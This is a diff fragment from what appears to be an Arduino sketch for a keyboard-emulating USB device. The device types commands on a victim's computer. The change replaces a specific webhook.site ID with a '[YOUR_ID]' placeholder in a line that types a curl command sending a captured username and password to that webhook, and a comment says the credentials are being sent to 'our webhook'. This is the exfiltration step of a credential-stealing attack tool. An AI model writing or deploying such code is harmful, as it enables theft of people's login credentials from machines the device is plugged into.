@@ -82,7 +82,7 @@ void setup() {
   delay(300);
 
   //Now we will send the credentials to our webhook
-  Keyboard.println("curl https://webhook.site/3d514486-23ee-413f-974f-5f6ad43c1e8d?user="+ userName +"\"&\"Pass="+ pass);
+  Keyboard.println("curl https://webhook.site/[YOUR_ID]?user="+ userName +"\"&\"Pass="+ pass);
   Keyboard.write(0xB0);
 
   //Close the window
